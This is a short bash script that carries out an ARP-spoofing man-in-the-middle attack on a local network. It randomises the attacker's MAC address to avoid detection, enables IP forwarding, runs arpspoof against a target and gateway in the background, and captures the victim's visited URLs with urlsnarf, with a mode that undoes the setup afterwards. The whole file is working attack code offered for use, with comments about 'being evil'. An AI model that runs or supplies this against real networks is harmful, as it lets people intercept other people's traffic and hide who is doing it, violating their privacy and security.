#!/bin/bash

# USAGE:
# mitm_stuff.sh start|stop wlan0 192.168.10.213 192.168.10.1
if [ $1 == "--help" ] || [ $1 == "-h" ]; then
  echo "Script to preform basic ARP man-in-the-middle attack"
  echo "Shutdowns device, changes MAC address, enables IP forwarding, then vice versa"
  echo "[USAGE]mitm_auto start|stop iface target gateway"
  echo "[EXAMPLE] mitm_auto start|stop wlan0 192.168.10.213 192.168.10.1"
  exit
fi

if [ $1 == 'start' ]; then
    # Alert the user
    echo "STARTING..."
    echo "run again with 'stop' to undo this process"
    # Let's change out our mac-address before we go around being all sneaky like
    echo "Changing MAC addresses..."
    sudo ifconfig ${2} down
    sudo macchanger --random ${2}
    sudo ifconfig ${2} up 
    echo "Waiting 10 seconds for device to reconnect to network..."
    sleep 10
    echo "Done waiting, hope it connected"
 
    # Enable ip-forwarding
    printf "Setting ip_forward to "
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
 
    # Send out the arp-spoof, but run it quietly in the background so we can sniff other stuff
    2>/dev/null 1>/dev/null sudo arpspoof -c both -i ${2} -t ${3} -r ${4} &

    # Snarf URLs in this terminal pane cause why not
    sudo urlsnarf -i ${2}

elif [ $1 == 'stop' ]; then
    # Alert the user 
    echo "STOPPING..."

    # Disbale ip-forwarding
    printf "Setting ip_forward to "
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward

    # Kill off arpspoof, don't use -9 so it has a chance to de-arp
    sudo pkill arpspoof 

    # We can change back our mac address now that we're done being evil on the computer
    echo "Changing back MAC address..."
    sudo ifconfig ${2} down
    sudo macchanger -p ${2}
    sudo ifconfig ${2} up 
fi

